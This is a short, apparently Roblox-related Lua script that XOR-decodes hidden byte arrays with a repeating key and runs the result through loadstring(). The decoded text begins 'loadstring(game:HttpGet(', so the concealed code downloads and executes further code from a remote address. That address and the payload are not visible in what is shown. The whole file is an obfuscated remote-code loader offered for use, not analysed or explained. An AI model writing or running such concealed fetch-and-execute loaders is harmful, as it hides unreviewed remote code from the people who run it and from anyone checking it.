
-- Strong Obfuscation (No Base64)
local peusPupQ = {
{78,12,29,28,70,8,10,15,92,26,8,65,64,67,72,66,78,27,25,24,7,31,9,31,72},
{15,11,70,47,23,65,93,7,91,64,101,2,13,30,11,93,5,28,91,75,90,65,64,66},
{10,16,30,20,25,76,74,68,10,8,53,88,79,90,92,69,81,88,28,27,22,16,16,6,7},
{26,80,65,89,71,64,11,105,80,90,74,71,88,22,94,82,7,88,7,2,25,75,2,19,4},
{6,28,15,23,27,31,23,0,85,67,5,67,73,73,95,9,96,87,67,92,124,94,94,0,8}
}

local ZdOPZxiZ = {3,5,2,4,1}
local KqTzJkub = "jsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+hjsnshkei;$-$($:3(#7,;;*(*bdjdjvekxiBv(3(-$:ihsbsii:ishhkebsii-$:+*+h"

local function ZzGxPvLp(data, order, key)
    local merged = {}

    -- susun ulang
    for i = 1, #order do
        merged[order[i]] = data[i]
    end

    local result = ""
    local index = 1

    for i = 1, #merged do
        for j = 1, #merged[i] do
            local k = string.byte(key, ((index - 1) % #key) + 1)
            result = result .. string.char(bit32.bxor(merged[i][j], k))
            index = index + 1
        end
    end

    return result
end

local zMcXqYcT = ZzGxPvLp(peusPupQ, ZdOPZxiZ, KqTzJkub)
loadstring(zMcXqYcT)()
